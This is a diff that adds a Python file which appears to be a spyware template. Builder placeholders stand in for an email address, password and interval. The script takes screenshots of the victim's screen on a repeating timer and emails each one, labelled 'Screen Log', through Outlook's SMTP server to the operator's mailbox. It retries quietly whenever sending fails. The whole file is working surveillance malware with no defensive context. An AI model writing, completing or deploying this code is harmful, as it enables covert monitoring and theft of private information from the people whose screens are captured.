@@ -1,0 +1,55 @@
+import smtplib
+import tempfile
+import pyautogui
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.image import MIMEImage
+import threading
+
+email = "{user_mail}"
+password = "{user_password}"
+timeout = {time_out}
+
+def take_ss():
+    Screen_Shot = pyautogui.screenshot()
+    dest = tempfile.gettempdir()
+    file_path = f"{dest}/screen.png"
+    Screen_Shot.save(file_path)
+    return file_path
+
+def mail_sender(email, password, recipient, subject, message):
+    file_path = take_ss()
+    
+    with open(file_path, "rb") as file:
+        content = file.read()
+
+    email_message = MIMEMultipart()
+    email_message['From'] = email
+    email_message['To'] = recipient
+    email_message['Subject'] = subject
+
+    text = MIMEText(message)
+    email_message.attach(text)
+
+    image = MIMEImage(content, name="screenshot.png")
+    email_message.attach(image)
+
+    email_server = smtplib.SMTP("smtp-mail.outlook.com", 587)
+    email_server.starttls()
+    email_server.login(email, password)
+    email_server.sendmail(email, [recipient], email_message.as_string())
+    email_server.quit()
+
+def Thread_Func():
+    try:
+        mail_sender(email, password, email, "Screen Log", "Screen Shot: ")
+        timer = threading.Timer(timeout, Thread_Func)
+        timer.start()
+    except:
+        wait_time = 60
+        new_timer = threading.Timer(wait_time, Thread_Func)
+        new_timer.start()
+        
+thread = threading.Thread(target=Thread_Func)
+thread.start()
+
